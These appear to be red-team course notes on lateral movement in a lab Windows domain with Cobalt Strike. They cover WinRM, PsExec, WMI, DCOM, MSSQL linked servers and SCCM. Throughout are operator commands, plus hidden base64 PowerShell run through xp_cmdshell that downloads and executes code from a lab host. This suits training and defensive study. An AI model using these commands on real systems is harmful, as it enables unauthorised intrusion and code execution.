## jump

---

The first and most convenient is to use the built-in `jump` command - the syntax is `jump [method] [target] [listener]`.  Type `jump` to see a list of methods.  This will spawn a Beacon payload on the remote target, and if using a P2P listener, will connect to it automatically.

```
beacon> jump
```

## remote-exec

---

The second strategy is to use the built-in `remote-exec` command - the syntax is `remote-exec [method] [target] [command]`.  Type `remote-exec` to see a list of methods.

```
beacon> remote-exec
```

The `remote-exec` commands simply provide a means of executing commands on a remote target.  They are therefore not exclusive to lateral movement, but they can be used as such.  They require more manual work to manage the payload, but do offer a wider degree of control over what gets executed on the target.  You also need to connect to P2P Beacons manually using `connect` or `link`.

## Primitives

---

The third is to use Cobalt Strike's other primitives (`powershell`, `execute-assembly`, etc) to implement something entirely custom. This requires the most amount of effort but also offers you the greatest degree of control.  Custom methods can be integrated into the `jump` and `remote-exec` commands using Aggressor.

Each of these strategies are compatible with the various techniques described in the [[User Impersonation]] chapter.  For example, you can use `pth` to impersonate a user and then `jump` to move laterally.


## Seatbelt

---

Some [[Seatbelt]] commands can be ran remotely.

[[Seatbelt#OSInfo]]


## Windows Remote Management

---

The SMB Beacon is an excellent choice when moving laterally, because the SMB protocol is used extensively in a Windows environment, so this traffic blends in very well.

```
beacon> jump winrm64 web.dev.cyberbotic.io smb
```

WinRM will return a high integrity Beacon running as the user with which you're interacting with the remote machine as.


## PSExec

---

The `psexec` / `psexec64` commands work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary.  Beacons executed this way run as SYSTEM.

```
beacon> jump psexec64 web.dev.cyberbotic.io smb
```

A reliable way of searching for PsExec is by looking for 4697 service created events.  These are often quite rare, unless a service comes with a software installation or something similar.  Cobalt Strike generates a random 7-character alphanumeric string which it uses for both the service name and binary filename.  When setting the binPath for the service, it uses a UNC path to the ADMIN$ share.

`psexec_psh` doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).  The pattern it uses by default is `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ...`.

```
beacon> jump psexec_psh web smb
```


## Windows Management Instrumentation

---

As you may have noticed, WMI is not part of the `jump` command but it is part of `remote-exec`. The `remote-exec` method uses WMI's "process call create" to execute any command we specify on the target. The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

You can upload a file to a remote machine by `cd`'ing to the desired UNC path and then use the `upload` command.

```
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
Started process 3280 on web.dev.cyberbotic.io
```

The process is now running on WEB so now we need to connect to it.

```
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.30
```

As with WinRM, the process will be running in an elevated context of the calling user.


## CoInitializeSecurity

---

Beacon's internal implementation of WMI uses a [Beacon Object File](https://cobaltstrike.com/help-beacon-object-files), executed using the [beacon_inline___execute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) Aggressor function. When a BOF is executed the [CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process.  The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.

An example of that can look like the following:

```
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to web.dev.cyberbotic.io: 5
```

We know `jking` is a local admin on WEB but because `CoInitializeSecurity` has already been called (probably in the context of `bfarmer`), WMI fails with access denied.  As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as `spawn` and `spawnas`, or even `execute-assembly` with a tool such as `SharpWMI`.

```
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"

[*] Host                           : web.dev.cyberbotic.io
[*] Command                        : C:\Windows\smb_x64.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 3436
```


## DCOM

---

Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so we must use an external tool such as [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1). We'll see in a later module how this can be integrated into the `jump` command.

```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
Completed

beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.30
```


## MSSQL Lateral Movement

---

SQL Servers have a concept called "links", which allows a database instance to access data from an external source.  MS SQL supports multiple sources, including other MS SQL Servers.  These can also be practically anywhere - including other domains, forests or in the cloud.

We can discover any links that the current instance has:

``` sql
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/3cf/9ba/acf/link.png)

This shows that SQL-2 has a link to SQL-1.  The SQLRecon `links` module could also be used.

[[SQLRecon#Enumerate Links for an Instance]]

We can send SQL queries to linked servers using _OpenQuery_:

``` sql
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

The use of double and single quotes is important when using OpenQuery.

Or with SQLRecon.

[[SQLRecon#Query SQL Database#Query Linked Servers]]

We can also check the xp_cmdshell status with `/c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"`

If xp_cmdshell is disabled, you won't be able to enable it by executing sp_configure via OpenQuery.  If RPC Out is enabled on the link (which is not the default configuration), then you can enable it using the following syntax:

``` sql
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
```

We can query SQL-1 to find out if it has any further links.

[[SQLRecon#Enumerate Linked Servers for More Links]]

In this case it does not, but manually querying each server to find additional links can be cumbersome and time-consuming.  Instead, `Get-SQLServerLinkCrawl` can automatically crawl all available links and shows you a bit of information for each instance.

[[PowerUpSQL#Get-SQLServerLinkCrawl]]

This output shows that the link from SQL-2 to SQL-1 is configured with a local `sa` account, and that it has sysadmin privileges on the remote server.  Your level of privilege on the linked server will depend on how the link is configured.  It's worth noting that in this particular case, any user who has public read access to the SQL-2 database instance will inherit sysadmin rights on SQL-1.  We do not need to be sysadmin on SQL-2 first.

The `lwhoami` module in SQLRecon can show similar information.

[[SQLRecon#Enumerate Linked Servers]]

To execute a Beacon on SQL-1, we can pretty much repeat the same steps as previously.  However, note that SQL-1 may only be able to talk to SQL-2 and not to WKSTN-2 or any other machine in the DEV domain.

```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

```
beacon> rportfwd 8080 127.0.0.1 80
```

You can use xp_cmdshell on a linked server via OpenQuery (note that you need to prepend a dummy query) for it to work.

``` sql
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')
```

Or you can use the "AT" syntax:

``` sql
EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]
```

SQLRecon also has a convenient `lxpcmd` module. [[SQLRecon#xp_cmdshell Interaction]]

Once the payload has been executed, connect to the Beacon.

```
beacon> link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
```


## SCCM Lateral Movement

---

With Full or Application Administrator privileges over a device or a collection, we can deploy scripts or applications to aid in lateral movement.  To execute a command on every device in the DEV collection, we could do `exec -n DEV -p <path>`.

[[SharpSCCM#exec]]

By default, the above will execute Notepad as the user currently logged into each machine.  If a user is not logged in, then the command won't execute.  We can force it to execute as SYSTEM using the `-s` parameter, and this will execute on every machine regardless of whether a user is currently logged in or not.  As with the GPO Abuse chapter ([[Host Privilege Escalation#Modifying Existing GPOs]]), we can upload and execute a DNS Beacon payload.

[[SharpSCCM#exec#Force SYSTEM]]